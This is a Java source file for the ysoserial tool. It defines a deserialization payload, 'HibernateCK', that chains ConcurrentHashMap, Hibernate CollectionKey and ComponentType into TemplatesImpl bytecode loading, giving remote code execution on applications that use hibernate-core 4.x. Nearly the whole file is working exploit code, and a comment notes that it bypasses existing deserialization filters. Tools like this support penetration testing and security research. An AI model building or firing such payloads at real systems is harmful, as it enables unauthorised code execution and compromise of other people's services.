package ysoserial.payloads;

import java.util.concurrent.ConcurrentHashMap;

import org.hibernate.engine.spi.CollectionKey;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain (JDD, IEEE S&P 2024 — BofeiC/JDD-PocLearning):
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				ConcurrentHashMap.putVal()
					CollectionKey.equals()
						ComponentType.isEqual()
							ComponentType.getPropertyValues()
								PojoComponentTuplizer.getPropertyValues()
									BasicPropertyAccessor$BasicGetter.get()
										Method.invoke()
											TemplatesImpl.getOutputProperties()
												... (bytecode loading, RCE)

	Differs from Hibernate1:
		- Entry: ConcurrentHashMap (not HashMap)
		- Trigger: CollectionKey.equals() via hash collision (not TypedValue.hashCode())
		- Bridge: ComponentType.isEqual() (not ComponentType.getHashCode())
		- Bypasses filters on TypedValue

	Requires:
		hibernate-core 4.x (BasicPropertyAccessor$BasicGetter)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Authors({ Authors.BOFEI_CHEN })
@PayloadTest(precondition = "isApplicableJavaVersion")
public class HibernateCK implements ObjectPayload<ConcurrentHashMap>, DynamicDependencies {

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAtLeast(7);
	}

	public static String[] getDependencies() {
		return new String[] {
			"org.hibernate:hibernate-core:4.3.11.Final",
			"aopalliance:aopalliance:1.0",
			"org.jboss.logging:jboss-logging:3.3.0.Final",
			"javax.transaction:javax.transaction-api:1.2",
			"dom4j:dom4j:1.6.1"
		};
	}

	public ConcurrentHashMap getObject(final String command) throws Exception {
		final Object tpl = Gadgets.createTemplatesImpl(command);
		final Object getters = Hibernate1.makeHibernate4Getter(tpl.getClass(), "getOutputProperties");

		// ComponentType setup (reuse Hibernate1 pattern)
		PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
		Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

		ComponentType ctype = Reflections.createWithConstructor(
			ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
		Reflections.setFieldValue(ctype, "componentTuplizer", tup);
		Reflections.setFieldValue(ctype, "propertySpan", 1);
		Reflections.setFieldValue(ctype, "propertyTypes", new Type[] { ctype });

		// Two CollectionKeys — use different roles during put to avoid equals() trigger
		CollectionKey ck1 = Reflections.createWithoutConstructor(CollectionKey.class);
		Reflections.setFieldValue(ck1, "role", "role1");
		Reflections.setFieldValue(ck1, "key", tpl);
		Reflections.setFieldValue(ck1, "keyType", ctype);
		Reflections.setFieldValue(ck1, "hashCode", 1);

		CollectionKey ck2 = Reflections.createWithoutConstructor(CollectionKey.class);
		Reflections.setFieldValue(ck2, "role", "role2");  // different role → equals returns false
		Reflections.setFieldValue(ck2, "key", tpl);
		Reflections.setFieldValue(ck2, "keyType", ctype);
		Reflections.setFieldValue(ck2, "hashCode", 1);

		// Put both keys — different roles mean equals() short-circuits before isEqual()
		ConcurrentHashMap map = new ConcurrentHashMap();
		map.put(ck1, "a");
		map.put(ck2, "b");

		// Now match roles so equals() proceeds to isEqual() on deserialization
		Reflections.setFieldValue(ck2, "role", "role1");

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(HibernateCK.class, args);
	}
}
